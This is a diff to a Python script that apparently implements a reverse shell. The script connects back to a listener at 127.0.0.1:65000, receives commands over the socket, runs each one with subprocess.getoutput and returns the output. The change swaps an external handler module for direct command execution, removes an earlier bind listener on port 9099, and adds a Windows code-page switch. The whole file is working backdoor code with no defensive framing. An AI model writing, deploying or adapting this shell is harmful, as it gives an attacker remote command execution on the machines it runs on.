@@ -1,4 +1,5 @@
-from legend import client_legacy
+# from legend import client_legacy
+import os
 import socket, time
 import subprocess
 
@@ -15,14 +16,6 @@ def waiting(s=None, creds=()):
         return s
 
 
-s = socket.socket(2, 1)
-s.bind(('', 9099))
-s.listen(5)
-client, addr = s.accept()
-print("Gotcha")
-del s
-time.sleep(10)
-
 shell_addr = ("127.0.0.1", 65000)
 ip = shell_addr[0]
 
@@ -35,12 +28,14 @@ while s == None or s.fileno() == -1:
         s.connect(shell_addr)
     except ConnectionRefusedError:
         s.close()
-        
-        
+
+os.system("chcp 65001")
+
 while True:
     com = s.recv(1024).decode('cp65001')
     try:
-        client_legacy.MAIN(command=com, s=s, ip=ip)
+        ans = subprocess.getoutput(com)
+        s.send(ans.encode("cp65001"))
         s.send(subprocess.getoutput('cd').encode('cp65001'))
     except:
         s.close()
